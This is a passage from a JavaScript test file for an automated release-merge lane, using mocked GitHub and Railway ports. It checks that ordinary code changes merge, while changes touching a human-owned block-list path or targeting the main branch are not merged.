        listOpenDevelopPulls: async () => [pull],
        exclusionInputs: async (p) => ({ headBranch: p.headRefName, changedFiles: files.map((path) => ({ path })),
          changedFilesComplete: true, policyTestPaths: [], agentOwnPatterns: [] }),
        readPull: async () => pull,
        diffDigest: async () => DIFF,
        merge: async (number, headSha) => { merges.push([number, headSha]); return { result: "merged", sha: "9".repeat(40) }; },
        onDevelop: async () => true,
        commitsContaining: async () => new Set(), cancelledCommits: async () => new Set(),
      },
      railway: { developDeployments: async () => [] },
    };
    return { outcome: await runQaReleaseMergeLaneRound(ENV, ports), issued, merges };
  };
  const code = ["lib/conversationSearch.ts", "app/api/conversations/search/route.ts"];
  const merged = await run(pullOf(), code);
  assert.deepEqual(merged.issued, [{ pullRequestNumber: 42, headSha: HEAD }]);
  assert.deepEqual(merged.merges, [[42, HEAD]]);
  const blocked = await run(pullOf(), [...code, "lib/creditLedger.ts"]);
  assert.deepEqual([blocked.issued, blocked.merges], [[], []], "one block list path: a person's");
  const intoMain = await run(pullOf({ baseRefName: "main" }), code);
  assert.deepEqual([intoMain.issued, intoMain.merges], [[], []], "never main");
});
